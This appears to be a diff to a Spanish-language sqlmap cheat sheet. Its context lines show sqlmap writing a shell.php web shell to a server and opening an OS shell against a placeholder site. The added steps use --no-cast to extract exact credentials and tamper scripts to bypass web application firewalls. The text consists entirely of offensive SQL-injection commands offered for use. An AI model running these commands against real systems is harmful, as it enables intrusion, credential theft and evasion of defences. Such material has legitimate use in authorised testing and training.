@@ -30,3 +30,11 @@ sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/
 ```
 sqlmap -u "http://www.example.com/?id=1" --os-shell
 ```
+5. Usar --no-cast para extraer las credenciales exactas
+```
+sqlmap -u "http://www.example.com/?id=1" --no-cast
+```
+6. Para bypassear los WAF podemos usar --tamper=between,randomcase
+```
+sqlmap -u "http://www.example.com/?id=1" --tamper=between,randomcase
+```
